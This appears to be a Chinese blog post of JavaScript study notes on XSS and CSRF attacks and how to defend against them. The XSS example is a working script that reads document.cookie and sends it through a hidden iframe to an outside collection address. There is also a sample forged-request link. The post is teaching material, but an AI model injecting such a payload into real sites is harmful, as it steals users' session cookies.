---
title: Javascript基础4
date: 2016-09-17 16:00:00
categories: Javascript
tags: [Javascript,红皮书,读书笔记] #文章标签，可空，多标签请用格式，注意:后面有个空格
toc: true
comments: true
---
摘要：



<!-- more -->

# 1. web安全问题 #
探讨比较多的两种，XSS攻击和CSRF攻击。^1
## XSS： ##
Cross Site Script，跨站脚本，主要是攻击者在用户输入域里提交script代码，改变web端页面代码，其他用户访问这个页面的时候，就会受到影响，XSS攻击不会影响服务器端数据。
**攻击例子：**
```
// 用 <script type="text/javascript"></script> 包起来放在评论中
(function(window, document){
    
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase =  "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement('iframe');
    hideFrame.width = 0;
    hideFrame.height = 0;
    hideFrame.style.display = 'none';
    hideFrame.src = xssURI；

    // 开工
    document.body.appendChild(hideFrame);

    })(window, document)
```
这样，其他用户访问这个页面时，这个页面就会自动运行这一段脚本，于是就取得了该用户的cookie，并使用cookie发起了请求到攻击者的站点，这样就会泄露用户在该站点的cookie。

**如何防御**
对一切需要用户输入文本的地方，进行过滤。方式：

1. 如果不需要用户输入 HTML，只需要纯文本，对输入内容进行转义，
2. 如果允许用户输入 HTML，又要过滤其中的脚本，可以使用Tidy 等 HTML 清理库；

- 注意，仅仅粗暴地去掉`<script>`标签是不行的，因为可以在HTML 标签的 onclick 事件里写脚本，
- 复杂情况可以白名单重新整理，对用户输入内容使用HTML解析库遍历节点，获取其中数据，然后根据用户原有标签，重新构建HTML 元素数，构建过程中只使用白名单中的标签和属性。

## CSRF攻击 ##
Cross Site Request Forgery，跨站点请求伪造，主要是模仿网站的正常请求链接伪造请求，冒充用户在站内的正常操作。

**攻击例子：**

例如，一论坛网站的发贴是通过 GET 请求访问：
http://example.com/bbs/create_post.php?title=标题&content=内容
那么，我只需要在论坛中发一帖，包含一链接：
http://example.com/bbs/create_post.php?title=我是脑残&content=哈哈

那么其他用户点了这个链接，就会自动发这样一个帖子，既然可以发帖，也可以删帖、修改等
**如何防御**

1. 首先可以限制发帖内容不能包含本站点域名链接，但是攻击者还可以不在本站操作也可以将这个链接发出来诱导点击，
2. 提高攻击门槛，改良API设计，展示类使用GET，创建资源类使用POST，最理想的做法是使用 REST 风格 的 API 设计，GET、POST、PUT、DELETE四种请求方法对应资源的读取、创建、修改、删除。现在的浏览器基本不支持在表单中使用 PUT 和 DELETE 请求方法，我们可以使用 ajax 提交请求（例如通过 jquery-form 插件），也可以使用隐藏域指定请求方法，然后用 POST 模拟 PUT 和 DELETE
3. “请求令牌”，比较简单也比较有效。实现方法非常简单，首先服务器端要以某种策略生成随机字符串，作为令牌（token）， 保存在 Session 里。然后在发出请求的页面，把该令牌以隐藏域一类的形式，与其他信息一并发出。在接收请求的页面，把接收到的信息中的令牌与 Session 中的令牌比较，只有一致的时候才处理请求，否则返回 HTTP 403 拒绝请求或者要求用户重新登陆验证身份。

# 2. 一个form表单中有普通的字段还有文件，怎么提交给后台 #
h5formData
ENCTYPE="multipart/form-data"

# 3. 分析一段文本中单词出现的频率，并找出top 10 #


> by MaryTien from  [http://supermaryy.com](http://luckymona.github.com)
> 本文地址：[http://supermaryy.com/2016/09/17/read-book-professional-javascript3](http://luckymona.github.io/2016/09/17/read-book-professional-javascript3)





---
> 本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 miao.hnlk@gmail.com
> 本文地址：[http://supermaryy.com/2016/09/17/read-book-professional-javascript3](http://luckymona.github.io/2016/09/17/read-book-professional-javascript3)

Reference：

^1:[总结 XSS 与 CSRF 两种跨站攻击](http://www.cnblogs.com/wangyuyu/p/3388180.html)





